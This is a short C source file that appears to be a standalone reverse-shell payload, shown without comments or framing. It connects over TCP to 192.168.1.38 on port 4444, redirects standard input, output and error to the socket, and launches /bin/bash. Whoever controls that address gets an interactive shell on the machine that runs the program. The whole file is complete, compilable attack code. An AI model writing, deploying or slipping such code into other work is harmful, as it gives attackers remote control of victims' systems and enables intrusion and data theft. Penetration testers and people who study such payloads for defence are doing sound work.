#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void) {
    int sock;
    int port = 4444;

    struct sockaddr_in reversesockaddr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    reversesockaddr.sin_family = AF_INET;
    reversesockaddr.sin_port = htons(port);
    reversesockaddr.sin_addr.s_addr = inet_addr("192.168.1.38");

    connect(sock, (struct sockaddr *) &reversesockaddr, sizeof(reversesockaddr));

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    char * const argv[] = {"/bin/bash", NULL};
    execve("/bin/bash", argv, NULL);

    return 0;
}